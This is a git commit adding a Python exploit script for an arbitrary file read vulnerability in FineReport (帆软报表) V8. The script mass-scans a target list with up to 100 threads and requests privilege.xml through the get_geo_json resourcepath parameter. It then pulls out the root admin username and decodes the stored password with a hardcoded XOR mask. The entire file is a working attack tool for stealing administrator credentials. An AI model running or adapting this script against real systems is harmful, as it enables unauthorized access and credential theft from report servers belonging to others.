545ae9a65beda49d788ae89baf7d01ea258fbc8f
charis <84823804+cahris@users.noreply.github.com>
2022-11-30 10:29:32 +0800

    帆软报表 V8 任意文件读取漏洞
    增加了多线程，多个资产检测。

---
+++ exp1.py
@@ -0,0 +1,87 @@
+# 帆软报表 V8 任意文件读取漏洞
+# 作者 charis
+
+
+import requests
+import sys
+import re
+import time
+from threading import Thread, enumerate
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+
+
+def decode_passwd(cipher):
+    PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]  # 掩码
+    Password = ""
+    cipher = cipher[3:]  # 截断三位后
+    for i in range(int(len(cipher) / 4)):
+        c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
+        c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
+        Password = Password + chr(c2)
+    return Password
+
+def POC_1(target_url):
+    vuln_url_1 = target_url + '/WebReport/ReportServer'
+    vuln_url_2 = target_url + '/ReportServer'
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+    }
+
+    proxies = {
+        "http": "http://127.0.0.1:10811",
+        "https": "https://127.0.0.1:10811",
+    }
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response_1 = requests.get(url=vuln_url_1, timeout=5, verify=False, headers=headers, proxies=proxies)
+        response_2 = requests.get(url=vuln_url_2, timeout=5, verify=False, headers=headers, proxies=proxies)
+        if "部署页面" in response_1.text:
+            print("\033[32m[o] 目标部署页面为: {} \033[0m".format(vuln_url_1))
+            POC_2(vuln_url_1)
+        elif "部署页面" in response_2.text:
+            print("\033[32m[o] 目标部署页面为: {} \033[0m".format(vuln_url_2))
+            POC_2(vuln_url_2)
+        else:
+            print("\033[31m[x] 目标漏洞无法利用 \033[0m")
+            sys.exit(0)
+
+    except Exception as e:
+        pass
+        sys.exit(0)
+
+def POC_2(vuln_url_fileread):
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+    }
+
+    proxies = {
+        "http": "http://127.0.0.1:10811",
+        "https": "https://127.0.0.1:10811",
+    }
+    vuln_url = vuln_url_fileread + "?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response = requests.get(url=vuln_url, verify=False, timeout=5, headers=headers, proxies=proxies)
+        print("\033[32m[o] 正在访问: {} \033[0m".format(vuln_url))
+        if "rootManagerPassword" in response.text and response.status_code == 200:
+            print("\033[32m[o] 目标存在漏洞,读取敏感文件 \n{} \033[0m".format(response.text))
+            user_name = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerName>', response.text)
+            cipher = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerPassword>', response.text)
+            password = decode_passwd(cipher[0])
+            print("\033[34m[o] 后台账户密码为:{} {} \033[0m".format(user_name[0], password))
+        else:
+            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
+    except Exception as e:
+        pass
+
+if __name__ == '__main__':
+#domain格式为http://127.0.0.1:666或https://127.0.0.1:666
+    with open("D:\\code\\python\\exp\\帆软报表\\domain.txt", encoding="utf-8") as f:
+        for i in f.readlines():
+            # print(i.strip("\n"))
+            if len(enumerate()) < 100:
+                Thread(target=POC_1, args=(i.strip("\n"),)).start()
+            else:
+                time.sleep(1)
